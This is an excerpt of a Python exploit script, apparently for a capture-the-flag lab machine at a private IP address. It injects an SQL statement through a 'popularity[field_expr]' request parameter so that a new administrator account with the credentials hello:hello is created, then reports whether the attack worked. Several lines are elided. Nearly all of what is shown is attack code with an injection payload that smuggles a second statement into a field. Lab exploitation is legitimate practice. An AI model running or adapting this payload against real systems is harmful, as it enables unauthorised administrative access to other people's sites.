...
target = "http://10.129.172.106/index.php"
...
query = q.replace("\n", "").format(username="hello", password="hello")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(
    query
)

pfilter = str.encode(pfilter)
...
if r.ok:
    print("WORKED")
    print("Check {0}/admin with creds hello:hello".format(target))
else:
    print("DID NOT WORK")
